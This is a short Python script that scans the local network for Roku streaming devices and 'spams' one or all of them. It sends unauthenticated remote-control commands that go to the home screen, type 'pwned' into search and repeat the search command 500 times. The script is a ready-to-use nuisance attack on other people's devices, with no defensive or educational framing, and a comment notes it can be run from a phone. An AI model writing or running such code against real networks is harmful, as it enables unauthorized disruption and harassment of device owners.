# finds and spams rokus on the network
# run pip install roku to use this script
from roku import Roku
import re
import subprocess
import threading
import time

class rokoo:
    
    def spamit():
        subprocess.run("clear")
        print("scaning for roku devices... ")
        x = Roku.discover(timeout=10)
        subprocess.run("clear")
        ip_pattern = r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}"

        number = -1
        list = []
        for ip in x:
            list.append(ip)


        def spam(ipaddr):
            try:

                roku = Roku(str(list2[int(ipaddr)]))
            except Exception:
                 roku = Roku(str(ipaddr))
            roku.home()
            time.sleep(5)
            roku.search()
            roku.literal('pwned')
            time.sleep(2)
            for yeah in range(500):
                roku.search()
                


        number = -1
        list2 = []
        for xx in list:
            number += 1
            print(number)
            match = re.search(ip_pattern, str(str(xx)))
            list2.append(match.group())
            print(match.group())

        print("type all to spam all rokus one by one")
        ipaddr = input("or select the roku to spam by the number:  ")
        if ipaddr == 'all':
            for item in list2:
                print(item)
                spam(item) 
                # this script can work on your phone  if you pair it with pydroid.
        spam(ipaddr)
rokoo.spamit()